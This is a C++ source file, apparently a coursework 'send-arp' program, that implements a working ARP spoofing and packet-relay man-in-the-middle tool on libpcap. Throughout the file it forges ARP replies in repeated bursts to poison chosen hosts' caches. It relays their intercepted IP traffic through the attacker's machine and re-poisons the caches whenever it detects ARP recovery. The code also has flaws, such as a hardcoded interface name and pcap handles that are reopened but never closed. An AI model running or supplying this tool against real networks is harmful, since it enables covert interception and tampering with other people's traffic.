#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#include <sys/types.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>

#include <string>
#include <iostream>
#include <map>

#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>


using namespace std;

#define REQUEST 1
#define REPLY 2


#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

struct EthIpPacket final {
    EthHdr eth_;
    IpHdr ip_;
};

typedef struct
{
    char* dev_;
} Param;

Param param = {
    .dev_ = NULL };

typedef struct
{
    Mac my_mac;
    Mac sender_mac;
    Ip target_ip;
    Ip sender_ip;
} AttackArg;

typedef struct{
    Mac my_mac;
    Mac sender_mac;
    Mac target_mac;
    Ip my_ip;
    Ip sender_ip;
    Ip target_ip;
} RelayArg;

#pragma pack(pop)

void packetMakeFunction(EthArpPacket* packet, uint16_t op, Mac e_dmac, Mac e_smac, Mac a_smac, Ip a_sip, Mac a_tmac, Ip a_tip);
void find_My_IP_Mac(Ip *my_ip, Mac *my_mac);
Mac find_Mac_with_IP(pcap_t *handle, Mac my_mac, Ip my_ip, Ip your_ip);
void *attackSender(void *attackArg);
void infect(Mac sender_mac, Mac my_mac, Ip target_ip, Ip sender_ip);
void *relayAndRecover(void * relayArg);
int checkRelay(EthIpPacket* receivePacket, RelayArg* t_relayArg);
int checkRecover(EthArpPacket* receivePacket, RelayArg* t_relayArg);
void INThandler(int sig);

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> <sender ip> <target ip> ...\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1 192.168.10.2 192.168.10.3\n");
}


bool parse(Param* param, int argc, char* argv[])
{
    if (argc < 4 || argc % 2)
    {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

int pair;

int main(int argc, char* argv[]) {

    if (!parse(&param, argc, argv))
        return -1;
    ::pair = (argc - 2) / 2;
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    signal(SIGINT, INThandler);

    Mac my_mac;
    Ip my_ip;
    Ip sender_ip[::pair];
    Ip target_ip[::pair];
    map <Ip, Mac> IpMacPair;

    find_My_IP_Mac(&my_ip, &my_mac);
    for (int i = 0; i < ::pair; i++) {
        sender_ip[i] = Ip(argv[2 + 2 * i]);
        target_ip[i] = Ip(argv[3 + 2 * i]);
        if(IpMacPair.find(sender_ip[i]) == IpMacPair.end()) {
            IpMacPair.insert({sender_ip[i], find_Mac_with_IP(handle, my_mac, my_ip, sender_ip[i])});
        }
        if(IpMacPair.find(target_ip[i]) == IpMacPair.end()) {
            IpMacPair.insert({target_ip[i], find_Mac_with_IP(handle, my_mac, my_ip, target_ip[i])});
        }
    }

    // make attack thread
    AttackArg **attackArg = (AttackArg**)malloc(sizeof(AttackArg*) * ::pair);
    for (int i = 0; i < ::pair; i++) {
        attackArg[i] = (AttackArg*)malloc(sizeof(AttackArg));
        attackArg[i]->my_mac = my_mac;
        attackArg[i]->sender_mac = IpMacPair.find(sender_ip[i])->second;
        attackArg[i]->target_ip = target_ip[i];
        attackArg[i]->sender_ip = sender_ip[i];
    }
    pthread_t attackThread;
    pthread_create(&attackThread, NULL, attackSender, (void *) attackArg);

    // make relay thread
    RelayArg **relayArg = (RelayArg**)malloc(sizeof(RelayArg*) * ::pair);
    for (int i = 0; i < ::pair; i++) {
        relayArg[i] = (RelayArg*)malloc(sizeof(RelayArg));
        relayArg[i]->my_mac = my_mac;
        relayArg[i]->sender_mac = IpMacPair.find(sender_ip[i])->second;
        relayArg[i]->target_mac = IpMacPair.find(target_ip[i])->second;
        relayArg[i]->my_ip = my_ip;
        relayArg[i]->sender_ip = sender_ip[i];
        relayArg[i]->target_ip = target_ip[i];
    }
    pthread_t relayThread;
    pthread_create(&relayThread, NULL, relayAndRecover, (void *) relayArg);


    while(1){
        continue;
    }

    pcap_close(handle);
    for (int i = 0; i < ::pair; i++) {
        free(attackArg[i]);
        free(relayArg[i]);
    }
    free(attackArg);
    free(relayArg);
}


void packetMakeFunction(EthArpPacket* packet, uint16_t op, Mac e_dmac, Mac e_smac, Mac a_smac, Ip a_sip, Mac a_tmac, Ip a_tip)
{
    packet->eth_.dmac_ = e_dmac;
    packet->eth_.smac_ = e_smac;
    packet->eth_.type_ = htons(EthHdr::Arp);

    packet->arp_.hrd_ = htons(ArpHdr::ETHER);
    packet->arp_.pro_ = htons(EthHdr::Ip4);
    if(op == REQUEST) packet->arp_.op_ = htons(ArpHdr::Request);
    else if (op == REPLY) packet->arp_.op_ = htons(ArpHdr::Reply);

    packet->arp_.hln_ = Mac::SIZE;
    packet->arp_.pln_ = Ip::SIZE;

    packet->arp_.smac_ = a_smac;
    packet->arp_.sip_ = htonl(a_sip);
    packet->arp_.tmac_ = a_tmac;
    packet->arp_.tip_ = htonl(a_tip);
}

void find_My_IP_Mac(Ip *my_ip, Mac *my_mac)
{
    /* find my ip address */
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;

    //I want IP address attached to "enp0s3"
    strncpy(ifr.ifr_name, "enp0s3", IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFADDR, &ifr);

    *my_ip = Ip(inet_ntoa(((struct sockaddr_in*) & ifr.ifr_addr)->sin_addr));
    close(fd);


    /* find my mac address */
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (!(ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }

    //get my mac
    u_char temp[6] = { 0, };
    if (success) memcpy(temp, ifr.ifr_hwaddr.sa_data, 6);
    *my_mac = Mac(temp);
}

Mac find_Mac_with_IP(pcap_t *handle, Mac my_mac, Ip my_ip, Ip your_ip)
{
    EthArpPacket packet;
    char errbuf[PCAP_ERRBUF_SIZE];

    struct pcap_pkthdr* header;
    const u_char* r_packet;

    packetMakeFunction(&packet, REQUEST, my_mac.broadcastMac(), my_mac, my_mac, my_ip, my_mac.nullMac(), your_ip);
    packet.arp_.op_ = htons(ArpHdr::Request);

    while (true)
    {
        //send packet to you
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        //receive reply from you -> get your mac address
        handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
        res = pcap_next_ex(handle, &header, &r_packet);
        EthArpPacket* receivePacket = (EthArpPacket*) r_packet;

        if (res == 0) continue;
        else if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        else if (!(receivePacket->arp_.sip().operator == (your_ip))) {
            printf("#error) this ip = %s\n", std::string(receivePacket->arp_.sip()).data());
            continue;
        }

        printf("got it! mac = %s, with ip = %s\n", std::string(receivePacket->arp_.smac()).data(), std::string(receivePacket->arp_.sip()).data());
        return Mac(std::string(receivePacket->arp_.smac()).data());
    }
}

void *relayAndRecover(void * relayArg)
{
    RelayArg** t_relayArg = (RelayArg **) relayArg;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    EthArpPacket packet;

    int res;


    while (true)
    {
        struct pcap_pkthdr* header;
        const u_char* r_packet;

        handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
        res = pcap_next_ex(handle, &header, &r_packet);
        EthIpPacket* receivePacket = (EthIpPacket*) r_packet;

        if (res == 0) continue;
        else if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            continue;
        }
        else {
            for (int i = 0; i < ::pair; i++) {
                if (checkRelay(receivePacket, t_relayArg[i]) == 1) {
                    handle = pcap_open_live(param.dev_, 0, 0, 0, errbuf);
                    receivePacket->eth_.smac_ = t_relayArg[i]->my_mac;
                    receivePacket->eth_.dmac_ = t_relayArg[i]->target_mac;

                    res = pcap_sendpacket(handle, r_packet, header->len);
                    if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                    }
                    printf("Packet Relay Success\n");
                    break;
                }

                if (checkRecover((EthArpPacket*)r_packet, t_relayArg[i])) {
                    infect(t_relayArg[i]->sender_mac, t_relayArg[i]->my_mac, t_relayArg[i]->target_ip, t_relayArg[i]->sender_ip);
                    printf("Packet Recover Success\n");
                    break;
                }
            }
        }
    }
}

int checkRelay(EthIpPacket* receivePacket, RelayArg* t_relayArg)
{
    if (receivePacket->eth_.type() != 0x0800) {
        //printf("#error: This Packet is not IP Packet.\n");
        return 0;
    }

    if (receivePacket->eth_.smac() == t_relayArg->sender_mac) {
        if (receivePacket->eth_.dmac() == t_relayArg->target_mac.broadcastMac()) {
            printf("#error: This Packet is IP Packet, but BroadCast.\n");
            return 0;
        }
        else if (receivePacket->ip_.dip() == t_relayArg->my_ip){
            printf("#error: This Packet is IP Packet, but Originally Sent to Me.\n");
            return 0;
        }
        else {
            //printf("IP Packet from Sender(IP:%s) Caught! Relay Start\n",
                   //std::string(receivePacket->ip_.sip()).data());
            return 1;
        }
    }

    return 0;
}

int checkRecover(EthArpPacket* receivePacket, RelayArg* t_relayArg)
{
    if (receivePacket->eth_.type() != 0x0806) {
        //printf("#error: This Packet is not Arp Packet.\n");
        return 0;
    }

    // 1. Sender -> Target ARP Packet
    if (receivePacket->arp_.tip() == t_relayArg->target_ip)
        return 1;


    // 2. Target -> Sender ARP Packet
    if (receivePacket->arp_.tip() == t_relayArg->sender_ip)
        return 1;

    return 0;
}

void *attackSender(void *attackArg)
{
    AttackArg **t_attackArg = (AttackArg **) attackArg;
    while(true) {
        for (int i = 0; i < ::pair; i++)
            infect(t_attackArg[i]->sender_mac, t_attackArg[i]->my_mac, t_attackArg[i]->target_ip, t_attackArg[i]->sender_ip);
        printf("attack periodcally\n");
        sleep(15);

    }
}

void infect(Mac sender_mac, Mac my_mac, Ip target_ip, Ip sender_ip)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(param.dev_, 0, 0, 0, errbuf);

    EthArpPacket packet;
    packetMakeFunction(&packet, REPLY, sender_mac, my_mac, my_mac, target_ip, sender_mac, sender_ip);
    for (int i = 0; i < 100; i++) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
}

void INThandler(int sig)
{
    printf("infection finish\n");
    exit(0);
}
